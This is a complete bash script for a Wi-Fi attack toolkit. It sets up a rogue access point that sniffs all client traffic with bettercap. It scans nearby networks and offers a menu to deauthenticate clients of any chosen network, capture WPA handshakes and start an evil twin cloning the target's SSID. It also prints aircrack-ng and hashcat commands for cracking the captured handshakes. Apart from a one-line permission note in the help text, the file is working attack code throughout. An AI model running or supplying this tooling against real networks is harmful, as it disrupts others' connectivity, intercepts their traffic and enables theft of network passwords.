#!/usr/bin/env bash
set -euo pipefail

# ---- Config ----
INTERNET_IF="wlan0"      # uplink that's already online
AP_IF="wlan1"            # interface that will host the AP
SSID="WiFiAP"            # default network name (dynamically set in evil twin mode)
CHANNEL="6"
COUNTRY="BG"

GATEWAY_IP="10.0.0.1"
DHCP_START="10.0.0.10"
DHCP_END="10.0.0.254"

RUNTIME="/tmp/lab_open_ap"
HOSTAPD_CONF="$RUNTIME/hostapd.conf"
DNSMASQ_CONF="$RUNTIME/dnsmasq.conf"
IPTABLES_SAVE="$RUNTIME/iptables.save"
HOSTAPD_LOG="$RUNTIME/hostapd.log"
BETTERCAP_LOG="$RUNTIME/bettercap.log"
BETTERCAP_PCAP_DIR="$RUNTIME/sniff"
BETTERCAP_PID="$RUNTIME/bettercap.pid"
HANDSHAKE_DIR="$RUNTIME/handshakes"
ATTACK_IF="${ATTACK_IF:-$AP_IF}"  # Interface for attacking (default: same as AP)
SCAN_RESULTS="$RUNTIME/scan_results.txt"
EVIL_TWIN_DIR="$RUNTIME/evil_twin"

# Set during start by prompt_security()
SECURITY_MODE="${SECURITY_MODE:-open}"   # "open" or "wpa2"
PASSPHRASE="${PASSPHRASE:-}"

SCRIPT_NAME="$(basename "$0")"

print_help() {
  cat <<EOF
Usage:
  sudo $SCRIPT_NAME start
  sudo $SCRIPT_NAME stop
  sudo $SCRIPT_NAME deauth [MAC] [count] [capture]
  sudo $SCRIPT_NAME attack
  sudo $SCRIPT_NAME help
  sudo $SCRIPT_NAME -h | --help

Description:
  Brings up a Wi-Fi AP on \$AP_IF and NATs traffic out via \$INTERNET_IF.
  Runs hostapd + dnsmasq and starts bettercap packet capture (pcap in: $BETTERCAP_PCAP_DIR).
  On 'start' you'll be asked whether to secure the AP with WPA2-PSK.
  The 'deauth' command can disconnect clients from the AP and optionally capture
  authentication handshakes for later password cracking attempts.
  The 'attack' command provides an interactive menu for scanning networks and
  selecting various attack methods including evil twin, deauth, and handshake capture.

Current defaults:
  INTERNET_IF=$INTERNET_IF
  AP_IF=$AP_IF
  SSID=$SSID
  CHANNEL=$CHANNEL
  COUNTRY=$COUNTRY
  GATEWAY_IP=$GATEWAY_IP
  DHCP_START=$DHCP_START
  DHCP_END=$DHCP_END
  RUNTIME=$RUNTIME

Files/Logs:
  hostapd log: $HOSTAPD_LOG
  bettercap log: $BETTERCAP_LOG
  pcaps dir:   $BETTERCAP_PCAP_DIR

Examples:
  sudo $SCRIPT_NAME start
  sudo $SCRIPT_NAME stop
  sudo $SCRIPT_NAME deauth                # Interactive mode
  sudo $SCRIPT_NAME deauth FF:FF:FF:FF:FF:FF  # Deauth all clients
  sudo $SCRIPT_NAME deauth 00:11:22:33:44:55 10  # Deauth specific client with 10 packets
  sudo $SCRIPT_NAME deauth FF:FF:FF:FF:FF:FF 5 true  # Deauth all and capture handshakes

Notes:
  - Requires: hostapd, dnsmasq, iptables, ip, sysctl, bettercap
  - If NetworkManager manages \$AP_IF, the script sets it unmanaged during runtime.
  - The deauth function is for testing/educational purposes only.
    Use responsibly and only on networks you own or have permission to test.
EOF
}

ensure_root() {
  if [[ $EUID -ne 0 ]]; then echo "Run as root: sudo $0 {start|stop|help}"; exit 1; fi
}

check_bins() {
  for b in hostapd dnsmasq iptables ip sysctl bettercap; do
    command -v "$b" >/dev/null || { echo "Missing $b. Install it."; exit 1; }
  done
}

prompt_security() {
  # Ask if we want WPA2-PSK; default is open if blank/Enter.
  local ans
  while true; do
    read -r -p "Use WPA2-PSK password? [y/N]: " ans || true
    ans="${ans,,}"  # lowercase
    if [[ -z "$ans" || "$ans" == "n" || "$ans" == "no" ]]; then
      SECURITY_MODE="open"
      echo "→ Open network selected (no password)."
      break
    elif [[ "$ans" == "y" || "$ans" == "yes" ]]; then
      SECURITY_MODE="wpa2"
      # Read and confirm passphrase (8–63 chars)
      while true; do
        read -r -s -p "Enter WPA2 passphrase (8–63 chars): " pw; echo
        read -r -s -p "Confirm passphrase: " pw2; echo
        if [[ "$pw" != "$pw2" ]]; then
          echo "Passphrases do not match. Try again."
          continue
        fi
        if (( ${#pw} < 8 || ${#pw} > 63 )); then
          echo "Invalid length (${#pw}). Must be 8–63 characters."
          continue
        fi
        PASSPHRASE="$pw"
        # Do not echo the actual password back.
        echo "→ Secured network selected (WPA2-PSK)."
        break
      done
      break
    else
      echo "Please answer y or n."
    fi
  done
}

write_confs() {
  mkdir -p "$RUNTIME" "$BETTERCAP_PCAP_DIR"

  # hostapd config
  # Common header
  {
    echo "interface=$AP_IF"
    echo "driver=nl80211"
    echo "ssid=$SSID"
    echo "country_code=$COUNTRY"
    echo "hw_mode=g"
    echo "channel=$CHANNEL"
    echo "ieee80211n=1"
    echo "wmm_enabled=1"
    echo "auth_algs=1"
    if [[ "$SECURITY_MODE" == "open" ]]; then
      cat <<'OPEN'
wpa=0
OPEN
    else
      # WPA2-PSK only, CCMP
      cat <<SECURE
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=$PASSPHRASE
SECURE
    fi
  } > "$HOSTAPD_CONF"

  # dnsmasq config
  cat > "$DNSMASQ_CONF" <<EOF
interface=$AP_IF
bind-interfaces
domain-needed
bogus-priv
dhcp-range=$DHCP_START,$DHCP_END,255.255.255.0,12h
dhcp-option=3,$GATEWAY_IP
dhcp-option=6,$GATEWAY_IP
log-queries
log-dhcp
EOF
}

start_bettercap() {
  mkdir -p "$BETTERCAP_PCAP_DIR"
  local ts="$(date +%Y%m%d-%H%M%S)"
  local pcap="$BETTERCAP_PCAP_DIR/sniff-$ts.pcap"

  # Headless + no TTY: redirect stdin from /dev/null so it never asks "Are you sure..."
  nohup bettercap -iface "$AP_IF" -no-colors -silent \
    -eval "set net.sniff.local true; set net.sniff.output $pcap; net.sniff on" \
    > "$BETTERCAP_LOG" 2>&1 < /dev/null &

  echo $! > "$BETTERCAP_PID"
  echo "Bettercap started on $AP_IF → $pcap (log: $BETTERCAP_LOG)"
}

stop_bettercap() {
  # Stop via PID if available, else best-effort pkill
  if [[ -f "$BETTERCAP_PID" ]]; then
    local pid
    pid="$(cat "$BETTERCAP_PID" 2>/dev/null || true)"
    if [[ -n "${pid:-}" ]] && kill -0 "$pid" 2>/dev/null; then
      kill "$pid" 2>/dev/null || true
      sleep 0.5
      kill -9 "$pid" 2>/dev/null || true
    fi
    rm -f "$BETTERCAP_PID"
  fi
  pkill -f "^bettercap .* -iface $AP_IF" 2>/dev/null || true
}

deauth_clients() {
  local target_mac="${1:-}"
  local deauth_count="${2:-5}"
  local capture_handshake="${3:-false}"
  
  # Validate the AP is running
  if ! pgrep hostapd >/dev/null; then
    echo "Error: Access Point is not running. Start it first with: sudo $SCRIPT_NAME start"
    exit 1
  fi
  
  # If no target specified, ask for one or offer broadcast option
  if [[ -z "$target_mac" ]]; then
    echo "Connected clients:"
    ip neigh show dev "$AP_IF" | grep -v FAILED
    
    echo ""
    echo "Options:"
    echo "  1. Deauth all clients (broadcast)"
    echo "  2. Specify a client MAC address"
    echo "  q. Quit"
    
    read -r -p "Selection [1/2/q]: " selection
    
    case "$selection" in
      1)
        target_mac="FF:FF:FF:FF:FF:FF"  # Broadcast
        echo "→ Targeting all clients (broadcast deauth)"
        ;;
      2)
        read -r -p "Enter client MAC address: " target_mac
        if ! [[ "$target_mac" =~ ^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$ ]]; then
          echo "Invalid MAC address format. Expected format: XX:XX:XX:XX:XX:XX"
          exit 1
        fi
        echo "→ Targeting specific client: $target_mac"
        ;;
      q|Q)
        echo "Deauth canceled."
        exit 0
        ;;
      *)
        echo "Invalid selection."
        exit 1
        ;;
    esac
    
    # Ask about handshake capture
    read -r -p "Capture authentication handshake after deauth? [y/N]: " capture_ans
    capture_ans="${capture_ans,,}"  # lowercase
    if [[ "$capture_ans" == "y" || "$capture_ans" == "yes" ]]; then
      capture_handshake=true
    fi
  fi
  
  # If capturing handshakes, start monitoring before deauth
  local handshake_file=""
  local monitor_pid=""
  
  if [[ "$capture_handshake" == "true" ]]; then
    echo "Setting up handshake capture..."
    mkdir -p "$HANDSHAKE_DIR"
    local ts="$(date +%Y%m%d-%H%M%S)"
    handshake_file="$HANDSHAKE_DIR/handshake-$ts.pcap"
    
    # Start bettercap in handshake capture mode in background
    echo "Starting handshake capture on $AP_IF (will save to $handshake_file)"
    
    # Launch bettercap with wifi.recon to capture handshakes
    nohup bettercap -iface "$AP_IF" -no-colors -silent \
      -eval "set wifi.interface $AP_IF; set net.sniff.output $handshake_file; set net.sniff.filter 'ether proto 0x888e or wlan type mgt subtype beacon or wlan type mgt subtype probe-resp or wlan type mgt subtype assoc-req or wlan type mgt subtype assoc-resp or wlan type mgt subtype reassoc-req or wlan type mgt subtype reassoc-resp or wlan type mgt subtype auth'; wifi.recon on; net.sniff on" \
      > /dev/null 2>&1 &
    
    monitor_pid=$!
    echo "Handshake monitoring started (PID: $monitor_pid)"
    # Give it a moment to initialize
    sleep 2
  fi
  
  echo "Sending $deauth_count deauth packets to $target_mac..."
  
  # Use bettercap for deauth
  bettercap -iface "$AP_IF" -no-colors -silent -eval "set wifi.interface $AP_IF; wifi.deauth $target_mac $deauth_count"
  
  echo "Deauthentication complete."
  
  # If we're capturing handshakes, wait for reconnection attempts
  if [[ "$capture_handshake" == "true" && -n "$monitor_pid" ]]; then
    echo ""
    echo "Listening for handshakes... (CTRL+C to stop)"
    echo "Capturing to: $handshake_file"
    echo ""
    
    # Wait for handshakes (let user decide when to stop with CTRL+C)
    local capture_duration=30
    echo "Will automatically stop capturing after $capture_duration seconds..."
    
    # Show a countdown timer
    for (( i=$capture_duration; i>0; i-- )); do
      echo -ne "Time remaining: $i seconds\r"
      sleep 1
      
      # Check if monitoring process is still running
      if ! kill -0 $monitor_pid 2>/dev/null; then
        echo "Monitoring process terminated unexpectedly."
        break
      fi
    done
    
    # Kill the monitoring process
    if kill -0 $monitor_pid 2>/dev/null; then
      kill $monitor_pid 2>/dev/null
      sleep 1
      kill -9 $monitor_pid 2>/dev/null || true
    fi
    
    echo -e "\nHandshake capture completed."
    echo "Handshake saved to: $handshake_file"
    echo ""
    echo "You can use this file with password cracking tools like:"
    echo "  aircrack-ng $handshake_file -w <wordlist>"
    echo "  hashcat -m 22000 $handshake_file <wordlist>"
  fi
}

scan_networks() {
  local scan_duration="${1:-45}"  # Default 45 seconds or user-specified
  
  echo "Scanning for wireless networks..."
  mkdir -p "$RUNTIME"
  
  # Kill any existing bettercap instances
  pkill -f "^bettercap" 2>/dev/null || true
  
  # Start bettercap in scan mode
  echo "Starting scan on $ATTACK_IF (this may take up to $scan_duration seconds)"
  echo "WiFi scanning requires checking multiple channels sequentially, please be patient..."
  
  # Clear previous scan results
  rm -f "$SCAN_RESULTS"
  rm -f "$RUNTIME/networks_found.txt"
  
  # Create a temporary script file for bettercap
  local bettercap_script="$RUNTIME/scan_script.cap"
  cat > "$bettercap_script" <<EOF
set wifi.interface $ATTACK_IF
wifi.recon on
sleep $scan_duration
wifi.show
wifi.recon off
quit
EOF

  # Run bettercap with explicit script file and redirect to file
  bettercap -iface "$ATTACK_IF" -no-colors -silent -script "$bettercap_script" > "$SCAN_RESULTS" 2>&1 &
  local pid=$!
  
  # Show progress bar
  local i=0
  echo -n "Scanning: "
  while [ $i -le $scan_duration ] && kill -0 $pid 2>/dev/null; do
    # Print progress indicator
    printf "\rScanning progress: [%-50s] %d%%" "$(printf '█%.0s' $(seq 1 $((i*50/scan_duration))))" $((i*100/scan_duration))
    sleep 1
    i=$((i+1))
    
    # If we've exceeded the timeout by 50%, force kill
    if [ $i -gt $((scan_duration*3/2)) ]; then
      echo -e "\nScan taking too long, terminating..."
      kill -9 $pid 2>/dev/null || true
      break
    fi
  done
  
  # Wait for bettercap to complete or be killed
  wait $pid 2>/dev/null || true
  
  # Clean up the script file
  rm -f "$bettercap_script"
  
  # Clear progress line
  printf "\r%-80s\r" " "
  
  # Extract networks into a clean format
  if [ -f "$SCAN_RESULTS" ]; then
    # Filter and extract networks
    grep -E "^[a-fA-F0-9]{2}:" "$SCAN_RESULTS" |
      grep -v "<hidden>" > "$RUNTIME/networks_found.txt" || true
      
    # Check if we found any networks
    if [ -s "$RUNTIME/networks_found.txt" ]; then
      local network_count=$(wc -l < "$RUNTIME/networks_found.txt")
      echo "Scan completed. Found $network_count networks."
      
      # Format and display the results
      echo ""
      echo "Available Networks:"
      echo "-----------------"
      cat "$RUNTIME/networks_found.txt" |
        awk '{printf "%3d) %s %s (%s) Ch:%s Enc:%s\n", NR, $1, $3, $5, $4, $6}' |
        sed 's/"//g'
    else
      echo "Scan completed. No networks found."
    fi
  else
    echo "Scan failed to produce results."
  fi
  
  # Return success
  return 0
}

select_target_network() {
  # Count networks found
  local network_count=0
  if [ -f "$RUNTIME/networks_found.txt" ]; then
    network_count=$(wc -l < "$RUNTIME/networks_found.txt")
  fi

  # Debug output if no networks found
  if [ "$network_count" -eq 0 ]; then
    echo "Diagnostic information:"
    echo "1. Interface status:"
    iwconfig "$ATTACK_IF" 2>&1
    echo ""
    echo "2. Available wireless interfaces:"
    iwconfig 2>&1 | grep -E '^[a-z0-9]'
    echo ""
    echo "3. Scan results file content preview:"
    if [ -f "$SCAN_RESULTS" ]; then
      head -n 20 "$SCAN_RESULTS" 2>&1
    else
      echo "No scan results file found."
    fi
    
    echo ""
    echo "No networks found. What would you like to do?"
    echo "1. Try a longer scan"
    echo "2. Try a different interface"
    echo "3. Try a different scanning method"
    echo "4. Quit"
    read -r -p "Selection [1]: " retry_option
    retry_option="${retry_option:-1}"
    
    case "$retry_option" in
      1)
        echo "Trying a longer scan..."
        read -r -p "Scan duration in seconds [90]: " longer_duration
        longer_duration="${longer_duration:-90}"
        
        if [[ "$longer_duration" =~ ^[0-9]+$ ]]; then
          scan_networks "$longer_duration"
          # Recount networks
          if [ -f "$RUNTIME/networks_found.txt" ]; then
            network_count=$(wc -l < "$RUNTIME/networks_found.txt")
          fi
          
          if [ "$network_count" -eq 0 ]; then
            echo "Still no networks found."
            echo "Try checking if your wireless adapter supports monitor mode and packet injection."
            echo "You might need to use a different adapter or external antenna."
            return 1
          fi
        else
          echo "Invalid duration. Please retry the scan."
          return 1
        fi
        ;;
      
      2)
        echo "Available wireless interfaces:"
        iwconfig 2>/dev/null | grep -E '^[a-z0-9]' | cut -d' ' -f1
        read -r -p "Enter interface to use: " alt_if
        
        if [ -n "$alt_if" ] && iwconfig "$alt_if" >/dev/null 2>&1; then
          ATTACK_IF="$alt_if"
          echo "Switched to interface $ATTACK_IF"
          # Restart attack workflow with new interface
          echo "Setting new interface to monitor mode..."
          ip link set "$ATTACK_IF" down 2>/dev/null || true
          iwconfig "$ATTACK_IF" mode monitor 2>/dev/null || iw dev "$ATTACK_IF" set type monitor 2>/dev/null || true
          ip link set "$ATTACK_IF" up 2>/dev/null || true
          scan_networks 60
          # Recount networks
          if [ -f "$RUNTIME/networks_found.txt" ]; then
            network_count=$(wc -l < "$RUNTIME/networks_found.txt")
          fi
        else
          echo "Invalid interface. Exiting."
          return 1
        fi
        ;;
      
      3)
        if command -v airodump-ng >/dev/null 2>&1; then
          echo "Trying scan with airodump-ng..."
          # Prepare for airodump scan
          mkdir -p "$RUNTIME"
          # Run airodump-ng in background and capture output
          airodump-ng --output-format csv -w "$RUNTIME/airodump" "$ATTACK_IF" >/dev/null 2>&1 &
          airodump_pid=$!
          
          # Show countdown
          echo "Scanning for 30 seconds..."
          for (( i=30; i>0; i-- )); do
            printf "\rTime remaining: %d seconds " $i
            sleep 1
          done
          
          # Kill airodump-ng
          kill $airodump_pid 2>/dev/null
          
          # Process the CSV output
          if [ -f "$RUNTIME/airodump-01.csv" ]; then
            # Skip first line, get APs, remove commas in SSIDs
            tail -n +2 "$RUNTIME/airodump-01.csv" |
              grep -v "^$" |
              awk -F, '{gsub(/,/,"_",$14); print $1","$4","$14","$6}' |
              head -n -1 > "$RUNTIME/networks_found.txt"
            
            # Recount networks
            if [ -s "$RUNTIME/networks_found.txt" ]; then
              network_count=$(wc -l < "$RUNTIME/networks_found.txt")
              echo -e "\nScan completed. Found $network_count networks."
            else
              echo -e "\nScan completed. No networks found with airodump-ng either."
              echo "Your wireless adapter may not support the required features."
              return 1
            fi
          else
            echo -e "\nAirodump scan failed."
            return 1
          fi
        else
          echo "airodump-ng not found. Cannot try alternative scanning method."
          return 1
        fi
        ;;
      
      4|q|Q)
        echo "Exiting."
        return 1
        ;;
      
      *)
        echo "Invalid option. Exiting."
        return 1
        ;;
    esac
  fi
  
  # Ask user to select a network
  local selection
  while true; do
    read -r -p "Select network number (1-$network_count) or 'r' to rescan: " selection
    
    if [[ "$selection" == "r" || "$selection" == "R" ]]; then
      scan_networks
      continue
    fi
    
    if [[ "$selection" =~ ^[0-9]+$ && "$selection" -ge 1 && "$selection" -le "$network_count" ]]; then
      break
    fi
    
    echo "Invalid selection. Please try again."
  done
  
  # Extract target information
  local line=$(sed -n "${selection}p" "$RUNTIME/networks_found.txt")
  TARGET_BSSID=$(echo "$line" | awk '{print $1}')
  TARGET_SSID=$(echo "$line" | awk '{print $3}' | sed 's/"//g')
  TARGET_CHANNEL=$(echo "$line" | awk '{print $4}')
  TARGET_ENCRYPTION=$(echo "$line" | awk '{print $6}')
  
  echo "Selected: $TARGET_SSID ($TARGET_BSSID) on channel $TARGET_CHANNEL"
  return 0
}

attack_menu() {
  echo ""
  echo "Attack Options for $TARGET_SSID:"
  echo "1. Deauthentication Attack"
  echo "2. Capture WPA Handshake"
  echo "3. Evil Twin Attack"
  echo "4. Select Different Network"
  echo "q. Quit"
  
  local choice
  read -r -p "Select attack type [1-4/q]: " choice
  
  case "$choice" in
    1)
      # Deauth attack
      echo "Performing deauthentication attack on $TARGET_SSID"
      local deauth_count
      read -r -p "Number of deauth packets to send [5]: " deauth_count
      deauth_count="${deauth_count:-5}"
      
      # Set channel for attack
      echo "Setting channel to $TARGET_CHANNEL..."
      iwconfig "$ATTACK_IF" channel "$TARGET_CHANNEL" || true
      
      # Send deauth to broadcast address (all clients)
      bettercap -iface "$ATTACK_IF" -no-colors -silent -eval "set wifi.interface $ATTACK_IF; wifi.deauth $TARGET_BSSID $deauth_count"
      echo "Deauthentication attack completed."
      ;;
      
    2)
      # Handshake capture
      echo "Capturing WPA handshake for $TARGET_SSID"
      
      # Set channel for attack
      echo "Setting channel to $TARGET_CHANNEL..."
      iwconfig "$ATTACK_IF" channel "$TARGET_CHANNEL" || true
      
      # Setup handshake capture
      mkdir -p "$HANDSHAKE_DIR"
      local ts="$(date +%Y%m%d-%H%M%S)"
      local handshake_file="$HANDSHAKE_DIR/$TARGET_SSID-$ts.pcap"
      
      # Start capture in background
      echo "Starting handshake capture (will save to $handshake_file)"
      nohup bettercap -iface "$ATTACK_IF" -no-colors -silent \
        -eval "set wifi.interface $ATTACK_IF; set net.sniff.output $handshake_file; set net.sniff.filter 'ether proto 0x888e or wlan type mgt subtype beacon or wlan type mgt subtype probe-resp or wlan type mgt subtype assoc-req or wlan type mgt subtype assoc-resp or wlan type mgt subtype reassoc-req or wlan type mgt subtype reassoc-resp or wlan type mgt subtype auth'; wifi.recon on; net.sniff on" \
        > /dev/null 2>&1 &
      
      local monitor_pid=$!
      
      # Send some deauths to force reconnections
      read -r -p "Number of deauth packets to send [5]: " deauth_count
      deauth_count="${deauth_count:-5}"
      
      echo "Sending $deauth_count deauth packets to $TARGET_BSSID..."
      bettercap -iface "$ATTACK_IF" -no-colors -silent -eval "set wifi.interface $ATTACK_IF; wifi.deauth $TARGET_BSSID $deauth_count"
      
      # Capture for a while
      local capture_duration=30
      echo "Capturing handshake for $capture_duration seconds..."
      
      # Show a countdown timer
      for (( i=$capture_duration; i>0; i-- )); do
        echo -ne "Time remaining: $i seconds\r"
        sleep 1
        
        # Check if monitoring process is still running
        if ! kill -0 $monitor_pid 2>/dev/null; then
          echo "Monitoring process terminated unexpectedly."
          break
        fi
      done
      
      # Kill the monitoring process
      if kill -0 $monitor_pid 2>/dev/null; then
        kill $monitor_pid 2>/dev/null
        sleep 1
        kill -9 $monitor_pid 2>/dev/null || true
      fi
      
      echo -e "\nHandshake capture completed."
      echo "Handshake saved to: $handshake_file"
      echo ""
      echo "You can use this file with password cracking tools like:"
      echo "  aircrack-ng $handshake_file -w <wordlist>"
      echo "  hashcat -m 22000 $handshake_file <wordlist>"
      ;;
      
    3)
      # Evil Twin Attack
      echo "Setting up Evil Twin for $TARGET_SSID"
      
      # Create directory for evil twin
      mkdir -p "$EVIL_TWIN_DIR"
      
      # Ask for evil twin configuration options
      local twin_ssid
      local twin_channel
      local twin_security
      local twin_passphrase
      
      # Option to customize SSID
      read -r -p "Evil Twin SSID [$TARGET_SSID]: " twin_ssid
      twin_ssid="${twin_ssid:-$TARGET_SSID}"
      
      # Option to customize channel
      read -r -p "Evil Twin Channel [$TARGET_CHANNEL]: " twin_channel
      twin_channel="${twin_channel:-$TARGET_CHANNEL}"
      
      # Option for security mode
      while true; do
        read -r -p "Security mode (open/wpa2) [open]: " twin_security
        twin_security="${twin_security:-open}"
        twin_security="${twin_security,,}"  # lowercase
        
        if [[ "$twin_security" == "open" || "$twin_security" == "wpa2" ]]; then
          break
        fi
        echo "Invalid security mode. Please enter 'open' or 'wpa2'."
      done
      
      # If WPA2, ask for passphrase
      if [[ "$twin_security" == "wpa2" ]]; then
        while true; do
          read -r -s -p "Enter WPA2 passphrase (8–63 chars): " twin_passphrase; echo
          if (( ${#twin_passphrase} < 8 || ${#twin_passphrase} > 63 )); then
            echo "Invalid length (${#twin_passphrase}). Must be 8–63 characters."
            continue
          fi
          break
        done
      fi
      
      # Start the evil twin
      echo "Starting Evil Twin AP with SSID: $twin_ssid on channel $twin_channel"
      
      # Save original AP_IF value
      local ORIG_AP_IF="$AP_IF"
      local ORIG_SSID="$SSID"
      local ORIG_CHANNEL="$CHANNEL"
      local ORIG_SECURITY_MODE="$SECURITY_MODE"
      local ORIG_PASSPHRASE="$PASSPHRASE"
      
      # Temporarily override global variables for AP setup
      AP_IF="$ATTACK_IF"
      SSID="$twin_ssid"  # Dynamic SSID based on target network
      CHANNEL="$twin_channel"
      SECURITY_MODE="$twin_security"
      PASSPHRASE="$twin_passphrase"
      
      echo "Creating evil twin of '$TARGET_SSID' with SSID: '$SSID'"
      
      # Start AP
      write_confs
      start_ap
      
      # Restore original values
      AP_IF="$ORIG_AP_IF"
      SSID="$ORIG_SSID"
      CHANNEL="$ORIG_CHANNEL"
      SECURITY_MODE="$ORIG_SECURITY_MODE"
      PASSPHRASE="$ORIG_PASSPHRASE"
      
      # Let user know how to stop the evil twin
      echo ""
      echo "Evil Twin AP is running. Press Enter to stop and return to the main menu."
      read -r
      
      # Stop the evil twin AP
      local ORIG_AP_IF="$AP_IF"
      AP_IF="$ATTACK_IF"
      stop_ap
      AP_IF="$ORIG_AP_IF"
      ;;
      
    4)
      # Select different network
      scan_networks
      select_target_network
      attack_menu
      ;;
      
    q|Q)
      echo "Exiting attack menu."
      return 0
      ;;
      
    *)
      echo "Invalid selection."
      attack_menu
      ;;
  esac
  
  # Return to attack menu after operation completes
  echo ""
  read -r -p "Press Enter to return to attack menu..."
  attack_menu
}

start_attack_workflow() {
  # Check wireless interface availability
  if ! iwconfig "$ATTACK_IF" >/dev/null 2>&1; then
    echo "Error: Interface $ATTACK_IF not found."
    echo "Available wireless interfaces:"
    iwconfig 2>/dev/null | grep -E '^[a-z0-9]' | cut -d' ' -f1
    read -r -p "Enter interface name to use: " new_if
    if [ -n "$new_if" ] && iwconfig "$new_if" >/dev/null 2>&1; then
      ATTACK_IF="$new_if"
    else
      echo "Invalid interface. Exiting."
      exit 1
    fi
  fi

  # Show interface details before proceeding
  echo "Interface info for $ATTACK_IF:"
  iwconfig "$ATTACK_IF" | grep -v "^\s"
  
  # Ensure interface is up
  ip link set "$ATTACK_IF" up 2>/dev/null || true
  
  # Check for monitor mode support
  if ! iw list 2>/dev/null | grep -q "monitor"; then
    echo "Warning: Monitor mode may not be supported on this device."
    echo "Scanning may not work correctly."
  fi
  
  # Try to set monitor mode
  echo "Setting $ATTACK_IF to monitor mode..."
  ip link set "$ATTACK_IF" down
  iwconfig "$ATTACK_IF" mode monitor 2>/dev/null || iw dev "$ATTACK_IF" set type monitor 2>/dev/null || true
  ip link set "$ATTACK_IF" up
  
  # Verify monitor mode
  if ! iwconfig "$ATTACK_IF" 2>/dev/null | grep -q "Mode:Monitor"; then
    echo "Warning: Failed to set monitor mode. Trying alternative method..."
    # Try alternative method with airmon-ng if available
    if command -v airmon-ng >/dev/null 2>&1; then
      airmon-ng start "$ATTACK_IF" >/dev/null 2>&1
      # Check if monitor interface was created
      mon_if=$(iwconfig 2>/dev/null | grep "Mode:Monitor" | head -n1 | cut -d' ' -f1)
      if [ -n "$mon_if" ]; then
        echo "Successfully created monitor interface: $mon_if"
        ATTACK_IF="$mon_if"
      fi
    fi
  fi
  
  # Confirm monitor mode
  if iwconfig "$ATTACK_IF" 2>/dev/null | grep -q "Mode:Monitor"; then
    echo "Successfully set $ATTACK_IF to monitor mode."
  else
    echo "Warning: Could not set monitor mode. Scanning may be limited."
  fi
  
  # Ask for scan duration
  read -r -p "WiFi scan duration in seconds [45]: " scan_time
  scan_time="${scan_time:-45}"
  
  # Validate input is a number
  if ! [[ "$scan_time" =~ ^[0-9]+$ ]]; then
    echo "Invalid duration. Using default of 45 seconds."
    scan_time=45
  fi
  
  # Scan for networks
  scan_networks "$scan_time"
  
  # Let user select a target
  select_target_network
  
  # Show attack menu
  attack_menu
}

start_ap() {
  rfkill unblock all || true
  if command -v nmcli >/dev/null 2>&1; then nmcli dev set "$AP_IF" managed no || true; fi

  ip link set "$AP_IF" down || true
  ip addr flush dev "$AP_IF" || true
  ip addr add "$GATEWAY_IP/24" dev "$AP_IF"
  ip link set "$AP_IF" up

  sysctl -w net.ipv4.ip_forward=1 >/dev/null

  iptables-save > "$IPTABLES_SAVE"
  iptables -t nat -A POSTROUTING -o "$INTERNET_IF" -j MASQUERADE
  iptables -A FORWARD -i "$INTERNET_IF" -o "$AP_IF" -m state --state RELATED,ESTABLISHED -j ACCEPT
  iptables -A FORWARD -i "$AP_IF" -o "$INTERNET_IF" -j ACCEPT

  pkill dnsmasq 2>/dev/null || true
  dnsmasq -C "$DNSMASQ_CONF"

  nohup hostapd "$HOSTAPD_CONF" > "$HOSTAPD_LOG" 2>&1 &

  # small settle
  sleep 1

  start_bettercap

  local mode_label="OPEN"
  [[ "$SECURITY_MODE" == "wpa2" ]] && mode_label="WPA2-PSK"
  echo "AP '$SSID' ($mode_label) on $AP_IF (GW $GATEWAY_IP). Internet via $INTERNET_IF."
  echo "DHCP: $DHCP_START – $DHCP_END"
  echo "hostapd log: $HOSTAPD_LOG"
}

stop_ap() {
  echo "Stopping services..."
  stop_bettercap
  pkill hostapd 2>/dev/null || true
  pkill dnsmasq 2>/dev/null || true

  if [[ -f "$IPTABLES_SAVE" ]]; then
    iptables-restore < "$IPTABLES_SAVE" || true
    rm -f "$IPTABLES_SAVE"
  else
    iptables -t nat -D POSTROUTING -o "$INTERNET_IF" -j MASQUERADE 2>/dev/null || true
    iptables -D FORWARD -i "$INTERNET_IF" -o "$AP_IF" -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null || true
    iptables -D FORWARD -i "$AP_IF" -o "$INTERNET_IF" -j ACCEPT 2>/dev/null || true
  fi

  sysctl -w net.ipv4.ip_forward=0 >/dev/null || true
  if command -v nmcli >/dev/null 2>&1; then nmcli dev set "$AP_IF" managed yes || true; fi
  ip addr flush dev "$AP_IF" || true
  ip link set "$AP_IF" down || true

  echo "Stopped. Logs and pcaps in: $RUNTIME"
}

# --- CLI parsing (help flags) ---
case "${1:-}" in
  -h|--help|help)
    print_help
    exit 0
    ;;
esac

case "${1:-}" in
  start)
    ensure_root
    check_bins
    prompt_security
    write_confs
    start_ap
    ;;
  stop)
    ensure_root
    stop_ap
    ;;
  deauth)
    ensure_root
    check_bins
    deauth_clients "${2:-}" "${3:-5}" "${4:-false}"
    ;;
  attack)
    ensure_root
    check_bins
    start_attack_workflow
    ;;
  *)
    echo "Usage: sudo $SCRIPT_NAME {start|stop|deauth|attack|help}"
    echo "Try:   sudo $SCRIPT_NAME --help"
    exit 1
    ;;
esac